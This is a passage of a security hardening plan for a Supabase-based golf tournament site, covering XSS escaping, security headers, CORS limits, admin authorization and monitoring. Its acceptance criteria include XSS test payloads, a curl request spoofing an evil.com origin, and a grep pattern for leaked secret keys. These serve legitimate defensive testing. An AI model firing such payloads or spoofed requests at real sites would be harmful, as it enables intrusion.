`<td ...>${esc(p.trash_talk) || '—'}</td>`
```

Also fix the edit modal (`admin.html:1748–1751`):
```js
// BEFORE:
`<div class="edit-modal-title">Edit <em>${p.first_name} ${p.last_name}</em></div>`
`<input ... value="${p.first_name || ''}">`

// AFTER:
`<div class="edit-modal-title">Edit <em>${esc(p.first_name)} ${esc(p.last_name)}</em></div>`
`<input ... value="${esc(p.first_name || '')}">`
```

Also fix the removePlayer inline call (admin.html:1207):
```js
// BEFORE:
onclick="removePlayer('${p.id}','${p.first_name} ${p.last_name}')"

// AFTER:
onclick="removePlayer('${p.id}','${esc(p.first_name)} ${esc(p.last_name)}')"
// Or better: use data attributes and add an event listener to avoid JS injection in event handlers
```

#### S2.2 — home.html fieldGrid (public page — highest priority)

**File:** `home.html`

```js
// BEFORE (line ~988):
return `...<div class="pc-name">${p.first_name} ${p.last_name}</div>...
        ${p.trash_talk ? `<div class="pc-trash">&ldquo;${p.trash_talk}&rdquo;</div>` : ''}`

// AFTER:
return `...<div class="pc-name">${esc(p.first_name)} ${esc(p.last_name)}</div>...
        ${p.trash_talk ? `<div class="pc-trash">&ldquo;${esc(p.trash_talk)}&rdquo;</div>` : ''}`
```

#### S2.3 — home.html settings fields

Settings fields that come from the DB (admin-written). Two options:
1. **Simple:** `esc()` all settings values before innerHTML injection. This breaks any intentional HTML in rich-text fields (e.g., if admin typed `<em>text</em>` for emphasis).
2. **Proper:** Install DOMPurify for the fields that legitimately need HTML. `textContent` for all others.

Given the platform has no build step (zero-dep static HTML), add DOMPurify via CDN to home.html (and any other page with rich-text settings rendering):

```html
<!-- In home.html <head> -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.1.6/dist/purify.min.js"
        integrity="sha384-[generate-hash]" crossorigin="anonymous"></script>
```

Then:
```js
// For rich-text fields (subtitle, details, format notes, bullets):
eyebrow.innerHTML = DOMPurify.sanitize(map.homepage_subtitle || '');
heroMeta.innerHTML = DOMPurify.sanitize(map.homepage_details || '');
fmtItems.innerHTML = DOMPurify.sanitize(items || '');
fmtNote.innerHTML = DOMPurify.sanitize(map.homepage_format_note || '');
el.innerHTML = DOMPurify.sanitize(map.reg_bullet_1 || '');
// etc.

// For concatenated structural HTML (schedGrid, teamTitle) — use esc() on any variable parts:
schedTitle.innerHTML = `${DAY_WORDS[numDays-1] || esc(String(numDays))} Day${numDays>1?'s':''} of <em>Competition</em>`;
// (numDays comes from settings, is an integer — parseInt it first to prevent injection)
```

**Acceptance criteria for S2:**
- Register a player with `first_name="<img src=x onerror=alert(1)>"` — admin table shows literal text, no alert fires
- Enter `trash_talk="<script>alert(1)</script>"` — home.html shows literal text
- Settings `homepage_subtitle` with `<em>styled</em>` — renders styled text (DOMPurify passes through safe tags)
- Settings `homepage_subtitle` with `<script>evil()</script>` — script stripped, no execution

---

### Sprint S3 — Security Headers + CORS Hardening
**Duration:** 0.5 day  

#### S3.1 — Add security headers to vercel.json

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=(), payment=(self)" }
      ]
    },
    {
      "source": "/(.*\\.html)",
      "headers": [
        { "key": "Cache-Control", "value": "no-store, must-revalidate" },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.resend.com; frame-ancestors 'none';"
        }
      ]
    },
    {
      "source": "/sw.js",
      "headers": [
        { "key": "Cache-Control", "value": "no-store, must-revalidate" }
      ]
    }
  ]
}
```

**Note on `'unsafe-inline'` in script-src:** The platform uses `onclick=` attributes and `<script>` blocks throughout (no build step). Removing `'unsafe-inline'` would require a full refactor of all event handlers to `addEventListener`. Flag this as a future hardening goal (S5). For now, `'unsafe-inline'` is required. The `frame-ancestors 'none'` clause replaces X-Frame-Options. Keep both for compatibility.

#### S3.2 — Restrict CORS on edge functions

**Edit:** `supabase/functions/create-checkout/index.ts` and `send-push/index.ts`

```typescript
const ALLOWED_ORIGINS = [
  'https://tourney.greenskeeper.studio',
  'https://bova.greenskeeper.studio',
  // add other slug subdomains as they go live, or use wildcard check:
];

function corsHeaders(origin: string | null) {
  const allowed = origin && (
    origin === 'https://tourney.greenskeeper.studio' ||
    /^https:\/\/[a-z0-9-]+\.greenskeeper\.studio$/.test(origin)
  ) ? origin : 'https://tourney.greenskeeper.studio';
  return {
    'Access-Control-Allow-Origin': allowed,
    'Access-Control-Allow-Headers': 'authorization, apikey, content-type',
    'Vary': 'Origin',
  };
}
```

Replace all `'Access-Control-Allow-Origin': '*'` occurrences with `corsHeaders(req.headers.get('Origin'))['Access-Control-Allow-Origin']`.

#### S3.3 — Fix create-checkout to use token email

**Edit:** `supabase/functions/create-checkout/index.ts`

```typescript
// BEFORE:
const { tournament_id, tournament_slug, tier, user_email } = await req.json();
// ...
.eq('owner_email', user_email)

// AFTER:
const { tournament_id, tournament_slug, tier } = await req.json();
const user_email = user.email; // from the verified JWT above
// ...
.eq('owner_email', user_email)
```

**Acceptance criteria S3:**
- `curl -I https://tourney.greenskeeper.studio` → response includes `Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`
- Browser console: CSP active (no blocked resources on normal navigation)
- `curl -H "Origin: https://evil.com" -X POST https://[supabase]/functions/v1/create-checkout` → `Access-Control-Allow-Origin` is NOT `https://evil.com`

---

### Sprint S4 — Admin Consolidation + Auth Hardening
**Duration:** 1 day  

#### S4.1 — Retire players.is_admin column

**Create:** `migrations/010_retire_is_admin.sql`

```sql
BEGIN;
-- Ensure all is_admin=true players are in tournament_admins before dropping
-- (should already be synced, but verify)
INSERT INTO tournament_admins (tournament_id, email)
SELECT p.tournament_id,
       lower(p.email)
FROM   players p
WHERE  p.is_admin = true
  AND  p.email IS NOT NULL
ON CONFLICT (tournament_id, email) DO NOTHING;

-- Drop the column
ALTER TABLE players DROP COLUMN IF EXISTS is_admin;

COMMIT;
```

**Edit `admin.html`:** Remove all references to `player?.is_admin` and `p.is_admin`. Admin gate becomes:
```js
const isOwner = tRow?.owner_email?.toLowerCase() === email.toLowerCase();
const { data: adminRow } = await sb.from('tournament_admins')
  .select('email')
  .eq('tournament_id', tournament.id)
  .eq('email', email.toLowerCase())
  .maybeSingle();
if (!isOwner && !adminRow && email !== PLATFORM_OWNER) {
  await sb.auth.signOut(); err.classList.add('show'); return;
}
```

Remove `toggleAdmin` reference to `players.update({ is_admin })`. Admin management exclusively via `tournament_admins` upsert/delete.

#### S4.2 — Investigate and fix IDOR on ?as=

**Inspect `player.html`:** Find where `?as=<email>` is handled. If the as-view is gated only by a client-side admin check, add an RLS-backed verification:

```js
// In player.html: when as= param present
const asEmail = new URLSearchParams(location.search).get('as');
if (asEmail) {
  // Verify current user is admin of the target player's tournament
  const { data: adminCheck } = await sb.from('tournament_admins')
    .select('email')
    .eq('tournament_id', tournament.id)
    .eq('email', currentUser.email)
    .maybeSingle();
  const isOwner = tournament.owner_email === currentUser.email;
  if (!adminCheck && !isOwner) {
    // Redirect to own portal
    location.href = location.pathname.replace(/\?.*/, '');
    return;
  }
}
```

#### S4.3 — Raise password minimum + verify email confirmation

In Supabase dashboard:
1. **Auth → Password Strength:** Set minimum length to 8. Enable "Require at least one uppercase letter, one digit."
2. **Auth → Email:** Verify "Enable email confirmations" is ON.
3. **Auth → Rate Limits:** Confirm default limits are in place (Supabase defaults: 5 emails/hour, 30 signins/5min).

**Acceptance criteria S4:**
- Attempting to sign up with 7-char password → rejected
- Email confirmation email arrives on signup
- Admin tab in admin.html no longer references is_admin column
- `?as=<other-player-email>` from non-admin session → redirected to own portal

---

### Sprint S5 — Defense in Depth + Cleanup
**Duration:** 0.5 day  
**This sprint is non-blocking. Ship after S1–S4 are verified.**

#### S5.1 — push_subscriptions RLS

Verify the push_subscriptions table in Supabase dashboard. Apply appropriate policies:

```sql
-- Authenticated users can subscribe (insert their own subscription)
CREATE POLICY "auth insert own subscription"
  ON push_subscriptions FOR INSERT TO authenticated
  WITH CHECK (true); -- tournament_id scoping depends on table schema

-- Users can delete their own subscription (unsubscribe)
CREATE POLICY "auth delete own subscription"
  ON push_subscriptions FOR DELETE TO authenticated
  USING (true); -- ideally match by some user identifier

-- No anon reads of subscription endpoints
-- service_role (send-push function) bypasses RLS — correct
```

#### S5.2 — Pin CDN scripts + add SRI

Generate SRI hash for the pinned Supabase JS version:
```bash
curl -s https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.2/dist/umd/supabase.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

Update all `<script>` tags loading Supabase:
```html
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.2/dist/umd/supabase.min.js"
        integrity="sha384-[hash-from-above]"
        crossorigin="anonymous"></script>
```

#### S5.3 — Rate limit trash_talk INSERT

Options (pick one based on complexity tolerance):
1. **Supabase pg_net + pg_cron:** Add a rate-limit check in a Postgres trigger or function. Complex.
2. **Client-side debounce:** Track last submit time in localStorage. Trivially bypassed but stops accidental spam.
3. **Edge function proxy:** Route trash_talk inserts through a new edge function that enforces `1 post/60s per player_id` using Deno KV or a `last_posted_at` column on `players`.

Recommended: Add `last_trash_talk_at` column to `players`, update it on each insert, and enforce `NOW() - last_trash_talk_at > interval '30 seconds'` in the INSERT WITH CHECK policy.

```sql
ALTER TABLE players ADD COLUMN IF NOT EXISTS last_trash_talk_at TIMESTAMPTZ;

-- In trash_talk INSERT policy (or a trigger):
-- Check that the player hasn't posted in the last 30 seconds
```

#### S5.4 — Platform.html server-side enforcement

Add a Supabase Edge Function `platform-action` that wraps the comp-account operation. It verifies `auth.email() === PLATFORM_OWNER_EMAIL` server-side:

```typescript
// supabase/functions/platform-action/index.ts
const PLATFORM_OWNER = Deno.env.get('PLATFORM_OWNER_EMAIL')!;
// ...
if (user.email !== PLATFORM_OWNER) return json({ error: 'Forbidden' }, 403);
// Then perform the billing_status update via service_role
```

---

## Part 4 — A-Grade Acceptance Checklist

### RLS
- [ ] Zero policies with `USING (true)` on write operations (INSERT, UPDATE, DELETE)
- [ ] `invitations`: anon UPDATE replaced with auth'd invitee-only scoped UPDATE
- [ ] `player_accounts`: authenticated users cannot write `billing_status` directly
- [ ] `players`: UPDATE/DELETE scoped to tournament admin/owner; `is_admin` column dropped
- [ ] `scores`: INSERT/UPDATE requires auth'd player whose player row matches
- [ ] `push_subscriptions`: RLS confirmed in dashboard, anon writes blocked
- [ ] `tournament_admins`: write policies present and scoped (verify dashboard)

### XSS
- [ ] All `first_name`, `last_name`, `email` fields wrapped in `esc()` before innerHTML
- [ ] `why_me` and `trash_talk` in admin table wrapped in `esc()`
- [ ] `home.html` player field grid wraps `first_name`, `last_name`, `trash_talk` in `esc()`
- [ ] `home.html` rich-text settings fields pass through `DOMPurify.sanitize()`
- [ ] `admin.html` edit modal `value` attributes use `esc()`
- [ ] Confirm: `scoreboard.html` `_parseMentions` is safe (already verified — ✅)

### Security Headers
- [ ] `Strict-Transport-Security` present on all responses
- [ ] `X-Content-Type-Options: nosniff` present
- [ ] `X-Frame-Options: DENY` present (or `frame-ancestors 'none'` in CSP)
- [ ] `Referrer-Policy: strict-origin-when-cross-origin` present
- [ ] `Content-Security-Policy` active and not blocking normal app function
- [ ] `Permissions-Policy` present

### Edge Functions
- [ ] `send-push` requires authentication (JWT check)
- [ ] `create-checkout` uses `user.email` from token, not body
- [ ] CORS restricted to `*.greenskeeper.studio` on all functions
- [ ] Stripe webhook signature verified (already done — ✅)
- [ ] No secrets hardcoded in any `.ts` file (already verified — ✅)

### Admin Authorization
- [ ] Single source of truth: `tournament_admins` + `owner_email` only
- [ ] `players.is_admin` column dropped
- [ ] `?as=<email>` in player.html gated by server-side admin check
- [ ] `platform.html` comp-account operation routed through auth'd edge function

### Auth / Session
- [ ] Supabase Auth password minimum: 8+ characters
- [ ] Email confirmation enabled in Supabase Auth settings
- [ ] Rate limits confirmed active in Supabase Auth dashboard

### Secrets
- [ ] No service_role key, Stripe key, or Resend key in any committed file (verified — ✅)
- [ ] Git history scan clean (verified — ✅)

### Score Integrity
- [ ] Score upsert uses `onConflict: 'player_id,round,hole'` (verified — ✅)
- [ ] Scores RLS prevents cross-player score manipulation

### Penetration Test Gate
- [ ] Tester with normal player auth token cannot: set `billing_status='comped'`, update another player's scores, accept another player's invitation, trigger push notifications unauthenticated, access admin.html without being in tournament_admins or owner

---

## Part 5 — Monitoring & Ongoing Hygiene

### Immediate (before Stripe goes live)
1. **Supabase API logs:** Dashboard → Logs → API. Set up alerts for unusual spike in `player_accounts` UPDATE operations (billing bypass attempts).
2. **Supabase Auth logs:** Dashboard → Logs → Auth. Monitor for high-frequency signup or login failures (brute force indicator).
3. **Verify all S1 migrations:** Run the acceptance criteria queries above against the live database before any player-facing announcement.

### Short-term (next 30 days)
4. **Sentry:** Add `<script src="https://browser.sentry-cdn.com/...">` to all pages. Catches client-side JS errors, unhandled promise rejections, and (with Sentry's security features) CSP violations. Free tier is sufficient for current traffic.
5. **Vercel Analytics:** Already available on Vercel — enable to track unusual traffic patterns.
6. **Dependabot / Renovate:** The project has no `package.json`, but CDN script versions can be tracked manually. Create a quarterly calendar reminder to check `@supabase/supabase-js` for security advisories.

### Quarterly
7. **RLS audit:** Every quarter, run a Supabase SQL query to list all policies:
   ```sql
   SELECT schemaname, tablename, policyname, permissive, roles, cmd, qual, with_check
   FROM pg_policies
   WHERE schemaname = 'public'
   ORDER BY tablename, cmd;
   ```
   Review for any `USING (true)` or `WITH CHECK (true)` on write operations. Block anything new that shouldn't be there.
8. **Git secret scan:** Run `git log --all -p | grep -Ei 'service_role|sk_live_|sk_test_|re_[a-zA-Z0-9]{10}'` quarterly after each sprint.
9. **Stripe radar review:** Once Stripe is live, check Stripe Radar disputes/blocks monthly.

### When Stripe Goes Live (Gate condition)
- S1 sprints must be complete and verified before activating Stripe
- Confirm `player_accounts` RLS blocks self-comping
- Test Stripe webhook with Stripe CLI (`stripe listen --forward-to`) against staging
- Confirm `billing_status` is only updated by the webhook (service_role), never by authenticated users

---

*End of security plan. Do not implement without Rob's review and approval.*
